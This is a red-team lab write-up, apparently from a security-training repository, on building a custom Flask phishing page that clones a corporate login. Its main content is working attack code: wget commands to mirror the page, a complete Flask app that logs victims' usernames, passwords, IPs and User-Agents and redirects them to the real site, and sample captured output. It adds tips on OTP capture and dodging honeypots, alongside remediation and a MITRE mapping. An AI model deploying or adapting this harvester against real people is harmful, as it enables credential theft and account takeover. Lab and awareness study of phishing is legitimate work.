> **English** | [Italiano](README.md)

# Credential Harvester - Flask Custom Login Page

> - **Phase:** Social Engineering - Custom Credential Harvesting
> - **Visibility:** Medium - the Flask server generates HTTP logs; the landing page is visible to URL reputation scanners; the domain/IP is traceable
> - **Prerequisites:** Python 3.10+, Flask, HTML/CSS knowledge for login page cloning; web server reachable from the target (VPS or tunnel)
> - **Output:** SE-014 (credentials captured in cleartext with IP/User-Agent logging - severity High)

- **Operating Environment:** Kali Linux Purple (Flask Server), Windows 10 VM (Victim with browser)
- **Target:** Simulated user visiting the landing page
- **Framework:** Flask 3.x, Python 3.11
- **Documented Techniques:** Website Cloning, Credential Capture, Request Logging

---

## Executive Summary

The custom Flask credential harvester offers maximum control over capture logic compared to integrated tools (GoPhish credential harvester, SET site cloner). The main advantage is customization: conditional redirect logic (show "wrong password" error to obtain a second attempt), structured JSON logging with complete metadata, integration with any delivery framework, and the ability to add a second form to capture the MFA code (OTP phishing).

---

## Credential Harvester: Flask Login Clone

**Finding ID:** `SE-014` | **Severity:** `High`

### PoC - Phase 1: Login Page Cloning

```Bash
# Target page cloning with wget
wget --mirror --convert-links --page-requisites --no-parent \
  https://portal.company-lab.local/login -P ./templates/

# Or manual save from browser:
# Ctrl+S -> "Web page, complete" -> save to templates/
```

### PoC - Phase 2: Flask Server

```python
# app.py
from flask import Flask, request, render_template, redirect
import json, datetime, os

app = Flask(__name__)
LOG_DIR = 'logs'
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    entry = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer', 'direct'),
        'username': request.form.get('username', ''),
        'password': request.form.get('password', '')
    }
    with open(f'{LOG_DIR}/creds.json', 'a') as f:
        f.write(json.dumps(entry) + '\n')
    print(f"\n[!] CREDENTIALS CAPTURED")
    print(f"    User: {entry['username']}")
    print(f"    Pass: {entry['password']}")
    print(f"    IP:   {entry['ip']}")
    # Redirect to real site (the victim notices nothing)
    return redirect('https://portal.company-lab.local/login?session_expired=1')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
```

### PoC - Phase 3: Execution and Capture

```Bash
sudo python3 app.py
```

```
 * Running on http://0.0.0.0:80
 * Press CTRL+C to quit
```

```
# The victim visits http://192.168.0.110/ and enters credentials:

[!] CREDENTIALS CAPTURED                                    <-- SE-014
    User: m.rossi@company-lab.local
    Pass: M4ri0R0ss1!
    IP:   192.168.0.120

# File logs/creds.json:
{"timestamp": "2026-03-15T10:16:42", "ip": "192.168.0.120", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0", "referer": "direct", "username": "m.rossi@company-lab.local", "password": "M4ri0R0ss1!"}
```

### Remediation

- **Immediate action:** password reset for the compromised user; log analysis for other captured accounts
- **Structural action:** MFA on all accounts; URL filtering with real-time categorization; awareness training for suspicious URL recognition
- **Verification:** access attempt with captured credentials - must fail after reset + MFA

---

## Lab Experience

Login page cloning was the most delicate phase. The first attempt with `wget --mirror` produced a functional page but with references to external resources (CSS, JS from CDN) that generated mixed content warnings in HTTPS. The solution was to download all resources locally and update the paths in the HTML template.

The most critical design point was the post-capture redirect. A redirect to the homepage (`/`) shows the same login page, arousing the victim's suspicion. The redirect to the real site with the `?session_expired=1` parameter is more credible: the victim sees the real login page and assumes they entered the wrong password.

---

## Theoretical Analysis: Custom vs Framework

The advantage of a custom tool over GoPhish is not power (GoPhish has superior metrics), but flexibility. Scenarios that require a custom harvester:
- **MFA phishing (without Evilginx):** a second form that captures the OTP code after username+password
- **Conditional redirect:** different redirect based on the submitted email (for selective targeting)
- **Honeypot detection:** if the username field contains a known honeypot address, don't log and redirect immediately

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement.

### Attacker Perspective (Red Team)

**Projected Kill Chain:**

```
[SE-014] Credentials captured via Flask harvester
        |
        v
Credential validation -> test on VPN/OWA/RDP
        |
        v
Account takeover -> corporate service access
        |
        v
BEC / Lateral Movement -> extended compromise
```

### Defender Perspective (Blue Team)

**IOC:** login from anomalous IP; uncategorized URL visited by multiple users; user report of "wrong password" after clicking email link.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | Custom Flask credential harvester development |
| Resource Development | Stage Capabilities: Upload Malware | `T1608.001` | Server deployment on attacker infrastructure |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | Link to Flask landing page sent via email |
| Credential Access | Input Capture: Web Portal Capture | `T1056.003` | Username and password capture from cloned page (SE-014) |

---

> **Note:** The tool was tested exclusively in a lab environment. No real credentials were captured.
